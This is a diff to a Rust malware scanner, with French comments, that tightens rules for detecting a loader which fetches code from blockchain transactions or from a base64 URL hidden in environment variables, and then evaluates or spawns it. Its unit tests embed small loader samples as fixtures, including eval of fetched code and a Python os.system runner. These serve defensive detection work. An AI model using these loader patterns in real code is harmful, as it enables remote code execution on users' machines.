@@ -111,15 +111,47 @@ static CHAIN_LOOKUP_RE: LazyLock<Regex> = LazyLock::new(|| {
     Regex::new(r"api\.trongrid\.io|eth_getTransactionByHash|getAddressTransactions").unwrap()
 });
 static SPAWN_RE: LazyLock<Regex> = LazyLock::new(|| {
-    Regex::new(r"\bsubprocess\b|child_process|\bexecSync\s*\(|\bspawn\s*\(").unwrap()
+    Regex::new(
+        r"\bsubprocess\b|child_process|\bexecSync\s*\(|\bspawn\s*\(|\bos\.(?:system|popen|exec[lv]p?e?)\s*\(|\bPopen\s*\(",
+    )
+    .unwrap()
 });
 
-/// `eval` d'un code téléchargé depuis une URL cachée en base64 dans une
-/// variable d'environnement : `atob(process.env.AUTH_API_KEY)`.
-static ENV_DECODE_RE: LazyLock<Regex> = LazyLock::new(|| {
-    Regex::new(r#"atob\s*\(\s*process\.env|Buffer\.from\s*\(\s*process\.env\.\w+\s*,\s*['"]base64"#)
+/// Le code de la transaction est relu depuis son champ `input` en hexadécimal.
+static TX_INPUT_DECODE_RE: LazyLock<Regex> = LazyLock::new(|| {
+    Regex::new(r#"fromhex|unhexlify|hexToUtf8|hexToString|toUtf8String|Buffer\.from\s*\([^)]{0,200}['"]hex['"]"#)
         .unwrap()
 });
+
+/// Fenêtre autour d'un indice : le chargeur tient en quelques dizaines de
+/// lignes, un bundle web3 étale les mêmes mots sur des mégaoctets.
+const LOADER_WINDOW: usize = 3000;
+
+static PROCESS_ENV_RE: LazyLock<Regex> = LazyLock::new(|| Regex::new(r"process\.env\b").unwrap());
+static B64_DECODE_RE: LazyLock<Regex> = LazyLock::new(|| {
+    Regex::new(r#"\batob\s*\(|Buffer\.from\s*\([^)]{0,200}['"]base64['"]"#).unwrap()
+});
+static DOWNLOAD_RE: LazyLock<Regex> = LazyLock::new(|| {
+    Regex::new(r#"\bfetch\s*\(|node-fetch|\bhttps?\.get\s*\(|\baxios\b|\bgot\s*\(|\brequest\s*\(|\burlopen\s*\("#)
+        .unwrap()
+});
+/// Évaluation de code, sans le `exec` de child_process.
+static EVAL_RE: LazyLock<Regex> = LazyLock::new(|| {
+    Regex::new(r"\beval\s*\(|\bFunction\s*\(|runInThisContext|runInNewContext").unwrap()
+});
+
+/// Tranche `[at - before, at + after]` alignée sur des frontières UTF-8.
+fn window(content: &str, at: usize, before: usize, after: usize) -> &str {
+    let mut start = at.saturating_sub(before);
+    while !content.is_char_boundary(start) {
+        start -= 1;
+    }
+    let mut end = (at + after).min(content.len());
+    while !content.is_char_boundary(end) {
+        end += 1;
+    }
+    &content[start..end]
+}
 
 /// Valeur `.env` qui est une URL encodée en base64 (`aHR0cDovL` = `http://`,
 /// `aHR0cHM6Ly` = `https://`).
@@ -146,6 +178,7 @@ fn is_polinrider_file(file_path: &Path, filename: &str, ext: &str) -> bool {
         || filename == ".gitignore"
         || filename == "init"
         || filename.starts_with(".env")
+        || filename.ends_with(".env")
         || filename.eq_ignore_ascii_case("config.bat")
         || (filename == "tasks.json"
             && file_path
@@ -348,7 +381,7 @@ fn scan_polinrider(relative: &str, filename: &str, ext: &str, bytes: &[u8]) -> V
         }
         // Node saute la ligne `#!` quel que soit l'interpréteur : un shebang
         // shell n'exempte que si rien d'autre ne trahit le chargeur.
-        f if f.starts_with(".env") => {
+        f if f.starts_with(".env") || f.ends_with(".env") => {
             if let Some(line) = first_line_matching(&content, &ENV_B64_URL_RE) {
                 push(
                     Severity::High,
@@ -679,9 +712,10 @@ pub fn scan_content(relative: &str, content: &str) -> Vec<Finding> {
 
     // Charge lue dans une transaction blockchain puis lancée (PolinRider,
     // variante Python du 2026-11-10).
-    if let Some(m) = CHAIN_LOOKUP_RE.find(content)
-        && (SPAWN_RE.is_match(content) || has_exec)
-    {
+    if let Some(m) = CHAIN_LOOKUP_RE.find_iter(content).find(|m| {
+        let w = window(content, m.start(), LOADER_WINDOW, LOADER_WINDOW);
+        TX_INPUT_DECODE_RE.is_match(w) && (SPAWN_RE.is_match(w) || EVAL_RE.is_match(w))
+    }) {
         out.push(finding(
             Severity::Critical,
             "chain-c2-loader",
@@ -694,8 +728,9 @@ pub fn scan_content(relative: &str, content: &str) -> Vec<Finding> {
     // URL cachée en base64 dans l'environnement, téléchargée puis évaluée
     // dans la foulée : un bundle qui décode une config JSON depuis l'env et
     // contient un `exec(` sans rapport bien plus loin n'est pas un chargeur.
-    if let Some(m) = ENV_DECODE_RE.find_iter(content).find(|m| {
-        exec_calls(content).any(|e| e.start() > m.start() && e.start() - m.start() <= 1000)
+    if let Some(m) = PROCESS_ENV_RE.find_iter(content).find(|m| {
+        let w = window(content, m.start(), 64, 1000);
+        B64_DECODE_RE.is_match(w) && DOWNLOAD_RE.is_match(w) && EVAL_RE.is_match(w)
     }) {
         out.push(finding(
             Severity::Critical,
@@ -1152,12 +1187,42 @@ mod tests {
         let web3 = "const tx = await provider.send('eth_getTransactionByHash', [hash]);\n";
         assert!(scan_content("node_modules/ethers/lib/provider.js", web3).is_empty());
 
-        let js = "const src = atob(process.env.AUTH_API_KEY);\nconst r = await proxy(src);\neval(await r.text());\n";
+        let js = "const src = atob(process.env.AUTH_API_KEY);\nconst proxy = (await import('node-fetch')).default;\nconst r = await proxy(src);\neval(await r.text());\n";
         let found = rules(&scan_content("scripts/lint_skill_content.ts", js));
         assert!(
             found.iter().any(|t| t.contains("env-remote-eval")),
             "{found:?}"
         );
+    }
+
+    #[test]
+    fn polinrider_loader_rules_review_cases() {
+        let has = |rel: &str, src: &str, rule: &str| {
+            rules(&scan_content(rel, src))
+                .iter()
+                .any(|t| t.contains(rule))
+        };
+        // Bundle web3 : lookup et Function( très éloignés, pas de décodage d'input.
+        let web3 = format!(
+            "send('eth_getTransactionByHash',[h]);{}var f=Function('return this')();\n",
+            "x".repeat(10_000)
+        );
+        assert!(!has(
+            "node_modules/web3/dist/web3.min.js",
+            &web3,
+            "chain-c2-loader"
+        ));
+        // Script CI : clé de service décodée puis passée à gcloud via child_process.
+        let ci = "const exec = promisify(require('child_process').exec);\nconst sa = Buffer.from(process.env.GCP_SA_KEY, 'base64').toString('utf8');\nfs.writeFileSync('/tmp/sa.json', sa);\nawait exec('gcloud auth activate-service-account --key-file=/tmp/sa.json');\n";
+        assert!(!has("scripts/deploy.js", ci, "env-remote-eval"));
+        // Variantes du vrai chargeur.
+        let bracket = "const u = Buffer.from(process.env['AUTH_API_KEY'], 'base64').toString();\neval(await (await fetch(u)).text());\n";
+        assert!(has("scripts/a.ts", bracket, "env-remote-eval"));
+        let destructured = "const { AUTH_API_KEY } = process.env;\neval(await (await fetch(atob(AUTH_API_KEY))).text());\n";
+        assert!(has("scripts/b.ts", destructured, "env-remote-eval"));
+        let os_system = "import json, os\nr = load('https://ethereum.publicnode.com', 'eth_getTransactionByHash')\nsrc = bytes.fromhex(r['result']['input'][2:]).decode()\nopen('/tmp/x.js','w').write(src)\nos.system('node /tmp/x.js')\n";
+        assert!(has("c.py", os_system, "chain-c2-loader"));
+        assert!(!polinrider("deploy/prod.env", b"AUTH_API_KEY=\"aHR0cHM6Ly9ldmls\"\n").is_empty());
     }
 
     #[test]
